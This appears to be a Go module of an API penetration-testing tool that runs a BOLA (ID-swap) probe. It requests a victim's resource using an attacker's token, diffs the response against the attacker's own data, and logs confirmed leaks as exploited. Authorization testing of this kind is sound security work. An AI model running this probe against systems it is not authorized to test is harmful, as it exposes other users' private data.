package logic

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"strings"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOLAContext defines the parameters for an ID-swap attack
type BOLAContext struct {
	BaseURL       string
	VictimID      string
	AttackerID    string // Added for Phase 9.2 Baseline
	AttackerToken string
}

// getResource fetches a resource and returns status and body for comparison
func (b *BOLAContext) getResource(resourceID string, token string) (int, string, error) {
	u, _ := url.Parse(b.BaseURL)
	u.Path = path.Join(u.Path, resourceID)
	target := u.String()

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.2 Surgical)")

	resp, err := GlobalClient.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

func (b *BOLAContext) Probe() {
	pterm.DefaultHeader.WithFullWidth(false).Println("Surgical BOLA Engine [PHASE 9.2]")

	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	if activeToken == "" {
		pterm.Error.Println("No Attacker Token configured.")
		return
	}

	// --- PHASE 9.2: BASELINE COLLECTION ---
	// We fetch the attacker's OWN resource to see what a "Valid" response looks like.
	var baselineBody string
	if b.AttackerID != "" {
		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline (Attacker's own data)...")
		_, body, err := b.getResource(b.AttackerID, activeToken)
		if err == nil {
			baselineBody = body
			spinner.Success("Baseline established.")
		} else {
			spinner.Warning("Could not establish baseline. Falling back to status-only mode.")
		}
	}

	// --- PHASE 9.2: THE PROBE ---
	spinner, _ := pterm.DefaultSpinner.Start(fmt.Sprintf("Probing Victim ID: %s", b.VictimID))
	code, probeBody, err := b.getResource(b.VictimID, activeToken)

	if err != nil {
		spinner.Fail(fmt.Sprintf("Connection failed: %v", err))
		return
	}

	// --- PHASE 9.2: SURGICAL ANALYSIS (The Patch) ---
	isVulnerable := false
	analysisMsg := ""

	if code == http.StatusOK {
		// Verify if the body is just a "Not Found" or "Error" message disguised as 200 OK
		lowerBody := strings.ToLower(probeBody)
		isGenericError := strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || strings.Contains(lowerBody, "denied")

		if baselineBody != "" && probeBody == baselineBody {
			// If the victim data is identical to the attacker's data, the server might be 
			// reflecting the user's own data regardless of the ID (False Positive).
			spinner.Warning("Potential False Positive: Server returned Attacker's own data for Victim ID.")
			analysisMsg = "Reflected self-data (False Positive)"
		} else if isGenericError {
			spinner.Warning("False Positive Filtered: 200 OK received but body indicates an error.")
			analysisMsg = "Cloaked Error Message"
		} else {
			// Body is 200 OK, differs from baseline, and isn't a known error string
			isVulnerable = true
			spinner.Success("VERIFIED BOLA VULNERABILITY")
		}
	}

	if isVulnerable {
		pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
		pterm.Warning.Println("Unauthorized data extraction confirmed via Response Diffing.")

		pterm.DefaultTable.WithData(pterm.TableData{
			{"METRIC", "VALUE"},
			{"RESOURCE ID", b.VictimID},
			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(probeBody))},
			{"DIFF STATUS", "Structural Divergence Confirmed"},
		}).WithBoxed().Render()

		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.2: SURGICAL BOLA",
			Target:  b.BaseURL + "/" + b.VictimID,
			Details: fmt.Sprintf("Confirmed BOLA on %s (Diff Verified)", b.VictimID),
			Status:  "EXPLOITED",
		}
	} else if code == 403 || code == 401 {
		spinner.Success("Target Secure (403 Forbidden)")
	} else {
		spinner.Stop() // 
		pterm.Info.Printfln("Result: %s", analysisMsg)
	}
}